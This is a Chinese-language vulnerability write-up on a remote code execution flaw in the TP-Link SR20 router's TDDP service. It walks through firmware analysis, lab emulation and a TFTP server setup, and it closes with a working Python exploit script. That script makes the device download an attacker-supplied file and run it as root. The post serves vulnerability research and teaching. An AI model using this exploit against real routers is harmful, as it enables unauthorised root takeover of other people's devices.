TP-Link SR20 v1

IoT安全
IoT安全
发布日期:   2026-10-23

信息收集

漏洞描述

TP-Link SR20 设置运行v1版本的TDDP，而TDDP v1版本中不存在验证功能。因此在向SR20的UDP 1040端口发送数据时候，SR20 都会接收并进行处理。如果发送的数据的第二个字节为0x31，SR20设备就会连续发送该请求的设备的TFTP并下载相应文件，然后使用Lua解析器以root权限下载后的文件，从而造成远程代码执行漏洞

从官网 https://www.tp-link.com/us/support/download/sr20/ 下载对应固件

binwalk

binwalk -Me tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin

squashfs的文件系统

接下来我们根据描述可知是TDDP引起的，我们去查找跟TDDP相关二进制程序

find . -name *tddp*

./usr/bin/tddp 这个程序

file/checksec

32位ARM架构 小端序

漏洞分析

把程序丢进ida进行分析，通过字符串查找 tddp关键字

然交叉引用找到对应函数 sub_936C

这里我们跟进sub_16418 ，对数据包进行解包

接收 UDP 数据包 → 解析 TDDP 协议 → 根据请求类型（1或2）调用不同处理函数 → 发送响应

关键是这个判断TPPD版本为1才会继续执行后续程序，当v2值为一的时候进入sub_15E74（）函数

整个使用了switch函数进行判断并执行对应函数，当第二个字节是0x31的时候，会触发漏洞函数sub_A580

继续跟进

s 来自攻击者输入（通过 sscanf(v19, "%[^;];%s", s, v10) 解析）

然后通过sub_91DC(“cd /tmp;tftp -gr %s %s &”, s, v16); 去执行

这里也可以看一下sub_91DC 函数

接收格式化字符串和参数 → 拼接到缓冲区 → 用 /bin/sh -c 执行

分析完整个流程，把固件模拟起来然后尝试攻击

启动服务

./usr/bin/tddp

由于该漏洞需要tftp服务进行下载，我们按照这个服务

sudo apt install atftpd

安装完成后，修改/etc/default/atftpd文件

USE_INETD设置为 false让 atftpd作为独立进程运行，而不是通过inetd启动

USE_INETD=false
OPTIONS="--tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot"

在主机根目录创建tftpboot文件夹，并赋权限

cd /
mkdir -p tftpboot
chmod 777 tftpboot

启动服务

sudo systemctl start atftpd  //启动
sudo systemctl status atftpd   //查看启动状态

主机nmap进行扫描测试服务存在

sudo nmap -p 1040 -sU 192.168.0.3

exp脚本

import sys
import binascii
import socket

port_send = 1040
port_receive = 61000

tddp_ver = "01"
tddp_command = "31"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X" % 00
tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])

sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_receive.bind(('', port_receive))

 
# Send a request

sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet = binascii.unhexlify(tddp_packet)

argument = "%s;arbitrary" % sys.argv[2]

packet = packet + argument.encode()

sock_send.sendto(packet, (sys.argv[1], port_send))

sock_send.close()

response, addr = sock_receive.recvfrom(1024)
r = response.encode('hex')
print(r)
